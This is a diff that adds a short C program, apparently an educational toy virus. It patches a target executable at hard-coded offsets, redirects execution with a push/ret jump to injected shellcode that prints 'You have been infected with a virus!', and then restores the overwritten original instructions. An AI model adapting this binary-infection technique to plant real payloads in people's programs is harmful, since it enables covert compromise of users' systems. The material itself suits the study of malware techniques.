@@ -1,0 +1,40 @@
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdint.h>
+
+int main(int argc, char *argv[]) {
+    off_t payload_location = 0x1383; 
+    off_t tricky_jump_patch_location = 0x1261;
+    off_t original_code_new_location = 0x139b;
+    uint8_t payload[] = {
+        0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x35, 0x0d, 0x00, 0x00, 0x00, 0xba, 0x25, 0x00, 0x00, 0x00, 0x0f, 0x05, 
+        
+        0x00, 0x00, 0x00, 0x00, 0x00, // room for original program's code
+        
+        0xc3, 0x59, 0x6f, 0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x62, 0x65, 0x65, 0x6e, 0x20, 0x69, 0x6e, 0x66, 0x65, 0x63, 0x74, 0x65, 0x64, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x61, 0x20, 0x76, 0x69, 0x72, 0x75, 0x73, 0x21, 0x0a, 0x00
+    };  
+    
+    const char *target = argv[1];
+    int fd = open(target, O_RDWR);
+
+    // save original code before overwriting
+    lseek(fd, tricky_jump_patch_location, SEEK_SET);
+    uint8_t original_code[5]; // does not include 0xc3
+    read(fd, original_code, sizeof(original_code));
+
+    // overwrite with tricky jump
+    lseek(fd, tricky_jump_patch_location, SEEK_SET);
+    write(fd, (uint8_t[]){0x68, 0x83, 0x13, 0x40, 0x00, 0xc3}, 6);
+
+    // inject paylaod
+    lseek(fd, payload_location, SEEK_SET);
+    write(fd, payload, sizeof(payload));
+
+    // patch payload with previously saved original program's code
+    lseek(fd, original_code_new_location, SEEK_SET);
+    write(fd, original_code, sizeof(original_code)); 
+
+    close(fd);
+    return 0;
+}
